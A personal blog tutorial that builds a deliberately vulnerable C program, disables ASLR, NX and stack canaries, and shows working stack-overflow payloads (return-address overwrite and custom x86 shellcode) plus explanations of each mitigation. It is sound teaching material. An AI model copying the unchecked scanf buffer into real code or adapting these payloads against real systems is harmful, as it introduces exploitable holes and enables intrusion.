
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buffer Overflow</title>
    <link rel="stylesheet" href="/styles/style.css"/>
    
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" sizes="any"/>
  </head>
  <body>
    <header class="site-header">
      <div class="site-header-content">
        <a class="site-title" href="/">Andreas Mausch</a>
        <nav class="site-nav">
          <a href="#" class="menu-icon">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              version="1.1"
              viewbox="0 0 16 16"
              width="100%"
              fill="none"
              stroke="currentColor"
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="1.5">
              <path d="m2.75 12.25h10.5m-10.5-4h10.5m-10.5-4h10.5"/>
            </svg>
          </a>
          <input id="nav-toggle" type="checkbox"/>
          <label class="nav-button-container" for="nav-toggle">
            <div class="nav-button"></div>
          </label>
          <ol class="site-nav-items">
            <a class="page-link" href="/"><li class="page-link-home">Home</li></a><a class="page-link" href="/whatsapp-viewer/"><li>WhatsApp Viewer</li></a><a class="page-link" href="/blog/"><li>Blog</li></a></ol>
        </nav>
      </div>
    </header>
    <div class="content">
      
<h1>Buffer Overflow</h1>
<div>
  <time class="postlist-date" datetime="2022-02-16T16:00:00.000+00:00">Feb 16, 2022</time>
</div>



<p>I remember I've tried hard when I was younger to create a super easy example of a buffer overflow.
I read about it and understood the mechanism, but never accomplished writing a real program which demonstrates the effect.</p>
<p>That thought crossed my mind today and I realized I should be able to do it today with a little more experience.</p>
<p>In addition, I found this wonderful article about it:<br>
<a href="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/" class="external-link" target="_blank">dhavalkapil.com</a></p>
<p>So, I will basically repeat the steps in the article and build my first own buffer overflow program.</p>
<h1 id="the-program" tabindex="-1">1. The program <a class="header-anchor" href="#the-program" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
<pre class="language-c"><code data-filename="buffer-overflow.c" class="language-c"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></span>
<span class="highlight-line"></span>
<span class="highlight-line"><span class="token keyword">void</span> <span class="token function">secretFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="highlight-line"><span class="token punctuation">{</span></span>
<span class="highlight-line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratulations!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="highlight-line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You have entered in the secret function!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="highlight-line"><span class="token punctuation">}</span></span>
<span class="highlight-line"></span>
<span class="highlight-line"><span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="highlight-line"><span class="token punctuation">{</span></span>
<span class="highlight-line">    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="highlight-line"></span>
<span class="highlight-line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter some text:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="highlight-line">    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="highlight-line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You entered: %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    </span>
<span class="highlight-line"><span class="token punctuation">}</span></span>
<span class="highlight-line"></span>
<span class="highlight-line"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="highlight-line"><span class="token punctuation">{</span></span>
<span class="highlight-line">    <span class="token function">echo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="highlight-line"></span>
<span class="highlight-line">    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></span>
<span class="highlight-line"><span class="token punctuation">}</span></span></code></pre>
<p>As you can see, the buffer size remains unchecked and a user can enter more than the expected 20 characters.
This leads to write into parts of the memory the program is not supposed to write.</p>
<p>We will overwrite the RETURN address of the echo() function,
in order to call the secretFunction() instead of returning to main().
The address is stored in the stack.
We need to find the right location and overwrite it.</p>
<h1 id="compilation" tabindex="-1">2. Compilation <a class="header-anchor" href="#compilation" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
<p>We need to set special compiler flags to disable any security checks.
It is great the compilers today have that built-in checks, but disabling them makes it easier to grasp the concepts
and maybe understand why those checks have been added over time.</p>
<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line">gcc <span class="token parameter variable">-m32</span> -fno-stack-protector -no-pie <span class="token parameter variable">-zexecstack</span> buffer-overflow.c <span class="token parameter variable">-o</span> buffer-overflow</span></code></pre>
<p>Run this to disable ASLR (see below):</p>
<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/randomize_va_space</span></code></pre>
<p>I've used gcc 11.1.0 in this example.</p>
<h1 id="running-and-crashing-the-program" tabindex="-1">3. Running and crashing the program <a class="header-anchor" href="#running-and-crashing-the-program" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
<p>This works fine:</p>
<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./buffer-overflow </span></span></span>
<span class="highlight-line"><span class="token output">Enter some text:</span>
<span class="highlight-line">Test</span>
<span class="highlight-line">You entered: Test</span></code></pre>
<p>A text more than 20 characters crashes the program, as expected:</p>
<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./buffer-overflow</span></span></span>
<span class="highlight-line"><span class="token output">Enter some text:</span>
<span class="highlight-line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
<span class="highlight-line">You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
<span class="highlight-line">fish: Job 1, './buffer-overflow' terminated by signal SIGSEGV (Adressbereichsfehler)</span>
<span class="highlight-line"></span>
<span class="highlight-line"></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token variable">$status</span></span></span></span>
<span class="highlight-line"><span class="token output">139</span></code></pre>
<p>Note: It still manages to output the text, before crashing.</p>
<h1 id="evan's-debugger" tabindex="-1">4. Evan's Debugger <a class="header-anchor" href="#evan's-debugger" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
<p>I used to play hundreds of hours with OllyDbg, a debugger for Windows.</p>
<p>During my research and having <code class="language-plain">gdb</code> in mind I thought there might be something similar to OllyDbg for Linux.
And indeed there is: <a href="https://github.com/eteran/edb-debugger" class="external-link" target="_blank">https://github.com/eteran/edb-debugger</a></p>
<p>I've installed it from <a href="https://aur.archlinux.org/packages/edb-debugger" class="external-link" target="_blank">here</a>, but I needed to change
the plugin directory manually after the installation (Preferences -&gt; Directories -&gt; Plugin Directory: <code class="language-plain">/usr/lib/edb</code>).</p>
<img src="/blog/2022-02-16-buffer-overflow/edb.png" width="1440" height="872" alt="undefined">
<h1 id="finding-the-right-address" tabindex="-1">5. Finding the right address <a class="header-anchor" href="#finding-the-right-address" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
<p>We don't just want to crash our program, we want to execute the secretFunction().
In order to do that, we need to know it's address.</p>
<p>We can either do it in edb (CTRL+ALT+S):</p>
<img src="/blog/2022-02-16-buffer-overflow/edb-symbols.png" width="506" height="319" alt="undefined">
<p>or via gdb:</p>
<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">gdb <span class="token parameter variable">-batch</span> <span class="token parameter variable">-ex</span> <span class="token string">"info functions"</span> <span class="token parameter variable">-ex</span> quit ./buffer-overflow</span></span></span>
<span class="highlight-line"><span class="token output">All defined functions:</span>
<span class="highlight-line"></span>
<span class="highlight-line">Non-debugging symbols:</span>
<span class="highlight-line">0x08049000  _init</span>
<span class="highlight-line">0x08049040  printf@plt</span>
<span class="highlight-line">0x08049050  puts@plt</span>
<span class="highlight-line">0x08049060  __libc_start_main@plt</span>
<span class="highlight-line">0x08049070  __isoc99_scanf@plt</span>
<span class="highlight-line">0x08049080  _start</span>
<span class="highlight-line">0x080490c0  _dl_relocate_static_pie</span>
<span class="highlight-line">0x080490d0  __x86.get_pc_thunk.bx</span>
<span class="highlight-line">0x080490e0  deregister_tm_clones</span>
<span class="highlight-line">0x08049120  register_tm_clones</span>
<span class="highlight-line">0x08049160  __do_global_dtors_aux</span>
<span class="highlight-line">0x08049190  frame_dummy</span>
<span class="highlight-line">0x08049196  secretFunction</span>
<span class="highlight-line">0x080491d2  echo</span>
<span class="highlight-line">0x08049228  main</span>
<span class="highlight-line">0x08049244  __x86.get_pc_thunk.ax</span>
<span class="highlight-line">0x08049250  __libc_csu_init</span>
<span class="highlight-line">0x080492c0  __libc_csu_fini</span>
<span class="highlight-line">0x080492c5  __x86.get_pc_thunk.bp</span>
<span class="highlight-line">0x080492cc  _fini</span></code></pre>
<h1 id="the-payload" tabindex="-1">6. The payload <a class="header-anchor" href="#the-payload" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
<p>Now, we need to know where exactly to put the address in our input text.
See the screenshot for details:</p>
<img src="/blog/2022-02-16-buffer-overflow/edb-stack.png" width="581" height="314" alt="undefined">
<p>Our variable <code class="language-plain">buffer</code> starts at <code class="language-plain">ffff:ce1c</code> (marked in blue) in this case.
The return address to the main function is stored at <code class="language-plain">ffff:ce3c</code> (marked in green).</p>
<p>If we manage to write the address of our secret function (<code class="language-plain">0x08049196</code>) into the return address value, our secret function will be called, instead of returning to the main function.
Note: I suppose to work on a little-endian machine. If you work on a big-endian machine, you need to change the byte order of DWORDs and WORDs.</p>
<p><code class="language-plain">0xce3c - 0xce3c = 0x20</code>, which is 32 in decimal.
We need to write 32 bytes (any bytes) followed by 0x08049196 into the <code class="language-plain">buffer</code> variable, and we should reach our goal:
(See <a href="https://stackoverflow.com/questions/66258454/printing-non-ascii-characters-in-python3" class="external-link" target="_blank">here</a> why we can't use print())</p>
<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x96\x91\x04\x08")'</span> <span class="token operator">|</span> ./buffer-overflow </span></span></span>
<span class="highlight-line"><span class="token output">Enter some text:</span>
<span class="highlight-line">You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��</span>
<span class="highlight-line">Congratulations!</span>
<span class="highlight-line">You have entered in the secret function!</span>
<span class="highlight-line">fish: Process 17504, './buffer-overflow' from job 1, 'python -c 'import sys; sys.stdo…' terminated by signal SIGSEGV (Adressbereichsfehler)</span></code></pre>
<p>Voilà. Now, the program still crashes, but our secret function was called before!</p>
<p>Next challenge could be to build a payload which contains and executes own code,
instead of executing code which already exists in the binary.</p>
<h1 id="executing-own-code" tabindex="-1">7. Executing own code <a class="header-anchor" href="#executing-own-code" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
<p>If we replace the RETURN address with the beginning of the buffer variable <code class="language-plain">ffff:ce1c</code>,
the input we entered will be treated as binary instructions and is executed:</p>
<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line">python <span class="token parameter variable">-c</span> <span class="token string">'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x1c\xce\xff\xff")'</span> <span class="token operator">|</span> ./buffer-overflow</span></code></pre>
<p>This fails with <em>SIGILL, Illegal instruction</em>. This is expected, as our <em>aaaaaa..</em> test string is not valid
machine code.</p>
<p>To generate it, we can use <a href="(https://archlinux.org/packages/extra/x86_64/yasm/)" class="external-link" target="_blank">yasm</a> for example.</p>
<h1 id="creating-the-code-payload" tabindex="-1">8. Creating the code payload <a class="header-anchor" href="#creating-the-code-payload" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
<pre class="language-nasm"><code data-filename="payload.asm" class="language-nasm"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token keyword">BITS 32</span></span>
<span class="highlight-line">BUFFER_ADDRESS EQU <span class="token number">0xffffce1c</span> <span class="token comment">; The address of the buffer variable in memory</span></span>
<span class="highlight-line">ORG BUFFER_ADDRESS</span>
<span class="highlight-line"><span class="token keyword">SECTION .text</span></span>
<span class="highlight-line"></span>
<span class="highlight-line">MOV <span class="token register variable">eax</span>, message</span>
<span class="highlight-line">MOV BYTE <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">]</span>, <span class="token register variable">dl</span> <span class="token comment">; Write null byte at end of sample string. dl happens to be zero here</span></span>
<span class="highlight-line">MOV <span class="token register variable">esp</span>, BUFFER_ADDRESS <span class="token comment">; Move stack pointer to free memory</span></span>
<span class="highlight-line">PUSH <span class="token register variable">eax</span></span>
<span class="highlight-line">CALL <span class="token number">0x08049050</span> <span class="token comment">; buffer-overflow!puts@plt</span></span>
<span class="highlight-line">MOV <span class="token register variable">ebp</span>, BUFFER_ADDRESS <span class="token operator">+</span> <span class="token number">0x2c</span> <span class="token comment">; restore original EBP</span></span>
<span class="highlight-line">JMP <span class="token number">0x0804923d</span> <span class="token comment">; buffer-overflow!main</span></span>
<span class="highlight-line"><span class="token label function">message:</span> db <span class="token string">"XX"</span>,<span class="token number">0xff</span></span>
<span class="highlight-line">dd BUFFER_ADDRESS <span class="token comment">; RETURN address</span></span></code></pre>
<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line">yasm <span class="token parameter variable">--arch</span><span class="token operator">=</span>x86 <span class="token parameter variable">--machine</span><span class="token operator">=</span>x86 <span class="token parameter variable">--objfile</span><span class="token operator">=</span>payload.bin payload.asm</span></code></pre>
<p>For disassembly, I found <code class="language-plain">objdump</code> useful:</p>
<pre class="language-bash"><code class="language-bash"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line">objdump --disassemble-all --disassembler-options<span class="token operator">=</span>intel,i386 <span class="token parameter variable">--target</span><span class="token operator">=</span>binary <span class="token parameter variable">--architecture</span> i386 payload.bin</span></code></pre>
<p>The EBP got overwritten by the too long input.
It was stored on the stack, and the leave instruction tried to restore it.
In order to not crash the program, we need to restore it.
That is what <code class="language-plain">MOV EBP, BUFFER_ADDRESS + 0x2c</code> does.</p>
<p><code class="language-plain">JMP 0x0804923d</code> returns to the original main function.</p>
<p>First note: Our payload must not maintain any characters which would stop scanf() from reading the input.
0x00, 0x0a, 0x20 are all forbidden.
That's why we first have the 0xff character after XX,
and only the payload writes a 0x00 at the end of the string during runtime.</p>
<p>Second note: The payload length must be exactly 36 bytes.
Or at least we need to make sure the RETURN address is written to offset 0x20.</p>
<p>With that payload, the program prints an additional line &quot;XX&quot; and then quits without crashing!</p>
<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">cat</span> payload.bin <span class="token operator">|</span> ./buffer-overflow</span></span></span>
<span class="highlight-line"><span class="token output">Enter some text:</span>
<span class="highlight-line">You entered: �9����P����P�!�H����XX����</span>
<span class="highlight-line">XX</span>
<span class="highlight-line"></span>
<span class="highlight-line"></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token variable">$status</span></span></span></span>
<span class="highlight-line"><span class="token output">0</span></code></pre>
<h1 id="security" tabindex="-1">9. Security <a class="header-anchor" href="#security" aria-hidden="true"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a></h1>
<ul>
<li>
<p>Position-independent Code<br>
PIE is not a security feature, but a requirement for Address Space Layout Randomization.
In Windows' .exe files, the information is stored in the <code class="language-plain">.reloc</code> table referenced in the optional headers.
In our example, we explicitly generated <strong>no</strong> PIE information via <code class="language-plain">-no-pie</code>.</p>
</li>
<li>
<p>Address Space Layout Randomization<br>
ASLR moves our program and the stack to random addresses.
The program can only be moved if PIE is provided.
The stack can be in a random address even if no PIE is provided.
In our example, we explicitly disabled ASLR via <code class="language-plain">/proc/sys/kernel/randomize_va_space</code>.
When disabled, our program and the stack are always in the same memory address on each run.
This way, we can use hard-coded absolute addresses as the return address and as part of the payload,
which makes our life a lot easier.
When enabled, we would need to have a payload which only uses relative addresses and does not rely on absolute addresses.
Also, we need to find a way to guess a correct RETURN address to put on the stack.</p>
</li>
<li>
<p>Non-Executable Stack<br>
Each memory area is flagged as readable, writable, executable, or a combination of them.
So when the stack is marked as non-executable (gcc's default), then you will see an error when the RETURN to a stack address is reached.
In our example, we explicitly marked the stack as executable via <code class="language-plain">-zexecstack</code>.</p>
</li>
<li>
<p>Stack Protection</p>
<blockquote>
<p>Emit extra code to check for buffer overflows, such as stack smashing attacks. This is done by adding a guard variable to functions with vulnerable objects. This includes functions that call &quot;alloca&quot;, and functions with buffers larger than 8 bytes. The guards are initialized when a function is entered and then checked when the function exits. If a guard check fails, an error message is printed and the program exits.</p>
</blockquote>
<p>In our example, we explicitly disabled stack protection via <code class="language-plain">-fno-stack-protector</code>.</p>
</li>
</ul>
<p>In the real-world we would need to bypass all of those measures.</p>
<p>To check which measures are enabled, you can use <a href="https://github.com/slimm609/checksec.sh" class="external-link" target="_blank">checksec</a>:</p>
<pre class="language-shell-session"><code class="language-shell-session"><button type="button" class="copy-to-clipboard"><i class="icon icon-copy"></i></button><span class="highlight-line"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">checksec <span class="token parameter variable">--file</span><span class="token operator">=</span>./buffer-overflow</span></span></span>
<span class="highlight-line"><span class="token output">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span>
<span class="highlight-line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   50) Symbols	  No	0		1		./buffer-overflow</span></code></pre>


<script async src="/scripts/index.js"></script>

    </div>
  </body>
</html>
